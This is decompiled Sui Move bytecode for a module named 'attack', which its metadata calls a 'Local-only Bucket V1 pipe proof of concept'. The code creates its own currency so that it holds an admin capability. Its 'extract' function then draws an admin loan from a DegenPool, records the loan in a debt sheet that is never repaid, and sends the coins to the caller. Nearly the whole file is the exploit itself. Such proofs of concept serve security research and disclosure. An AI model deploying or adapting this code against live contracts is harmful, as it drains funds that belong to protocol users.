module 0x587bd93ca5092e1d15dac3e98b6c1fba69cab39e0e9870b9d5824bb9e0c237be::attack {
    struct ATTACK has drop {
        dummy_field: bool,
    }

    struct SINK has drop {
        dummy_field: bool,
    }

    struct DebtVault<phantom T0> has key {
        id: 0x2::object::UID,
        sheet: 0xa90218c8ec02c619b2b4db3e3d32cfeb5c1cf762879ef75bae9f27020751d0f8::sheet::Sheet<SINK, T0>,
    }

    public entry fun extract<T0>(arg0: &mut 0xdb143afbc91b84a37c4bad1b9da19ca7a7b4afd0c594d618e1cb9b4bcf49a23::pool::DegenPool<ATTACK, T0>, arg1: &0xdb143afbc91b84a37c4bad1b9da19ca7a7b4afd0c594d618e1cb9b4bcf49a23::admin::AdminCap<ATTACK>, arg2: u64, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = SINK{dummy_field: false};
        let v1 = 0xa90218c8ec02c619b2b4db3e3d32cfeb5c1cf762879ef75bae9f27020751d0f8::sheet::new<SINK, T0>(v0);
        let v2 = SINK{dummy_field: false};
        0xa90218c8ec02c619b2b4db3e3d32cfeb5c1cf762879ef75bae9f27020751d0f8::sheet::add_creditor<SINK, T0, 0xdb143afbc91b84a37c4bad1b9da19ca7a7b4afd0c594d618e1cb9b4bcf49a23::pool::DEGEN_POOL<ATTACK>>(&mut v1, v2);
        let v3 = SINK{dummy_field: false};
        let v4 = DebtVault<T0>{
            id    : 0x2::object::new(arg3),
            sheet : v1,
        };
        0x2::transfer::share_object<DebtVault<T0>>(v4);
        0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::from_balance<T0>(0xa90218c8ec02c619b2b4db3e3d32cfeb5c1cf762879ef75bae9f27020751d0f8::sheet::receive<0xdb143afbc91b84a37c4bad1b9da19ca7a7b4afd0c594d618e1cb9b4bcf49a23::pool::DEGEN_POOL<ATTACK>, SINK, T0>(&mut v1, 0x1::option::destroy_some<0xa90218c8ec02c619b2b4db3e3d32cfeb5c1cf762879ef75bae9f27020751d0f8::sheet::Loan<0xdb143afbc91b84a37c4bad1b9da19ca7a7b4afd0c594d618e1cb9b4bcf49a23::pool::DEGEN_POOL<ATTACK>, SINK, T0>>(0xdb143afbc91b84a37c4bad1b9da19ca7a7b4afd0c594d618e1cb9b4bcf49a23::pool::loan_by_admin<ATTACK, T0, SINK>(arg0, arg1, arg2)), v3), arg3), 0x2::tx_context::sender(arg3));
    }

    fun init(arg0: ATTACK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2::coin::create_currency<ATTACK>(arg0, 9, b"ATTACK", b"Permissionless point type", b"Local-only Bucket V1 pipe proof of concept", 0x1::option::none<0x2::url::Url>(), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ATTACK>>(v1);
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<ATTACK>>(v0, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v7
}

